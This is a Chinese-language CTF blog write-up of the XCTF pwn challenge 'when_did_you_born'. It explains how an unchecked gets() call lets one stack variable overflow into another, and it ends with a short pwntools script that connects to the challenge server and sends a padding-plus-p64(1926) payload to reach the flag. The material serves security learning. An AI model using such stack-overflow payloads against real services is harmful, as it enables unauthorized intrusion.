---
title: "XCTF Pwn When_did_you_born"
date: 2020-02-06T18:04:27+08:00
author: NiceSeven
categories:
  - XCTF
tags:
  - Pwn
---

# when_did_you_born

checksec检查有那些防护

![image-20200206180831554](/images/image-20200206180831554.png)

64位程序开启NX、stack canary

![image-20200206181255811](/images/image-20200206181255811.png)

程序功能一问一答接收2个输入

拖入ida分析

![image-20200206183400104](/images/image-20200206183400104.png)

关键代码在两个if判断

![image-20200206184341850](/images/image-20200206184341850.png)

第一个if判断如果输入的是1926则直接返回，后面的都不会执行了，但是第二个if判断又要求输入的是1926，所以产生矛盾

通过仔细观察可以发现第二个if判断之前存在一个gets()函数没有做任何防护，并且变量v4与v5存在同一个栈上，所以这里可以使用栈溢通过v4来覆盖修改v5变量的值

![image-20200206190530043](/images/image-20200206190530043.png)

从伪代码可以看出第一次接收数据是传入v5第二次接收数据是传入v4

思路：

1、在第一次接收数据时传入不等于1926的值

2、在第二次接收数据时因为gets()函数对传入的数据长度没有做任何限制，所以可以通过v4栈溢出修改v5的值为1926来cat flag

![image-20200206190757664](/images/image-20200206190757664.png)

v4与v5之间的偏移为0x20-0x18

编写exp

```python
#!/usr/bin/env python
#-*-coding=UTF-8-*-
from pwn import *
sh = remote('111.198.29.45',30849)
sh.sendlineafter("What's Your Birth?",'0')
payload = 'a'*8 + p64(1926)#这里的8是v4到v5的偏移量0x20-0x18计算得来
sh.sendlineafter("What's Your Name?", payload)
sh.interactive()
```

![image-20200206201829950](/images/image-20200206201829950.png)

